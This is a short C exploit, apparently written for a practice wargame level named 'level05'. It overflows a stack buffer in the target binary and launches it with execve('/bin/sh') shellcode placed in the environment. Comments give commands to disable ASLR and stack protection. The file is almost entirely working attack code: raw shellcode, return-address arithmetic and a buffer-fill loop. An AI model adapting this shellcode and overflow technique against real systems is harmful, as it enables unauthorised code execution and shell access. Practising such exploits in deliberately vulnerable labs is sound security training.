// Disable Address Space Layout Randomization: sysctl -w kernel.randomize_va_space=0
// Disable stack protection: gcc -Wall -g -fno-stack-protector -z execstack level05.c -o level05

#include <stdio.h>
#include <string.h>
#include <unistd.h>

char sc[] = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
extern char **environ;

int main(int argc, char **argv)
{
	int buffer_size = 158;
        char *env[2] = {sc, NULL};
        char buf[buffer_size];
        int *ptr = (int *)(buf);
        int i;


	printf("Using buffer size: %d\n", buffer_size);


        int ret = 0xbfffffff
		- 4								/* 4 null bytes */
		- strlen("/home/robin/Documents/Hacking/tools/level05") - 1	/* binary + null byte */
		- strlen(sc)							/* shellcode + null byte */
		;
        //int ret = 0xbffffffa - strlen(sc) - strlen("/home/robin/Documents/Hacking/tools/level05");
       
        
	printf("Removing environment variables\n");
        for(i = 0; environ[i] != NULL; i++) {
		memset(environ[i], 0x00, strlen(environ[i]));
	}


	printf("Adding return address to buffer: 0x%x\n", ret);
        for (i = 0; i < buffer_size; i += 4) {
                *ptr++ = ret;
	}

        execle("/home/robin/Documents/Hacking/tools/level05", "level05", buf, NULL, env);
	return 0;
}
